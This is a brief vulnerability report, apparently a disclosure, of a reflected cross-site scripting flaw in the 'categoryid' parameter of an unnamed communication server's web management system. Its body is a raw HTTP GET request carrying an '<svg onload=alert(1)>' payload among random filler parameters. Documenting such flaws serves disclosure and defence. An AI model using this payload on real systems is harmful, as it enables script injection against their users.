# The categoryid parameter xss vulnerability in the communication server web management system
...
```
GET /?callback=p5620&cat=javq6&categoryid=categoryid=<svg onload=alert(1)>//&emailto=ih705&from=s7mr2&immagine=q9kp4&jsonp=evxp0&key=jza06&keywords=rxvf3&lang=hqp59&list_type=twby9&mod=ndiw0&month=tq8g8&name=cshm7&q=h9540&region=yecb3&terms=eo7f1&token=y9kz9&url=veet0&view=n6ff4 HTTP/1.1
Host: 
